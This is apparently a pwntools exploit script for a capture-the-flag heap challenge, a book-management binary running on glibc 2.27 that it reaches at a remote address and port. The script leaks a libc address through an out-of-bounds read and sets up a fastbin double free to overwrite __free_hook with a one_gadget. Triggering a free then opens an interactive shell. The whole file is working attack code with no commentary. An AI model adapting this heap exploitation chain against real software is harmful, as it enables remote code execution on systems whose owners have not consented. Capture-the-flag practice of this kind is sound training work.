#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("152.118.201.241", 3025)

    return r


def main():
    r = conn()

    def add_book(location: int, title: bytes, page: int):
        r.sendlineafter(b"> ", b"1") 
        r.sendlineafter(b"put it?: ", str(location).encode())
        r.sendlineafter(b"Title: ", title)
        r.sendlineafter(b"Page: ", str(page).encode())

    def read_book(location: int):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"Where is the book?: ", str(location).encode())
        r.recvuntil(b"Title: ")
        leak_title = r.recvline().strip()
        r.recvuntil(b"Page: ")
        leak_page = r.recvline().strip()
        return leak_title, leak_page

    def remove_book(location: int):
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b"Where is the book?: ", str(location).encode())

    _, stdout_leak = read_book(-4)

    libc.address = int(stdout_leak) - (libc.sym['_IO_2_1_stdout_'] + 0x83)

    for i in range(9):
        add_book(i, b"lalaleen", i)

    for i in range(7):
        remove_book(i)

    remove_book(7)
    remove_book(8)
    remove_book(7)

    for i in range(7):
        add_book(i, b"cincai", i)

    add_book(7, p64(libc.sym['__free_hook']), 1)
    add_book(8, b"leen", 1)
    add_book(9, b"leen", 1)

    el_one_gadget = libc.address + 0x4f302

    add_book(10, p64(el_one_gadget), 1)

    remove_book(0)
    r.interactive()


if __name__ == "__main__":
    main()
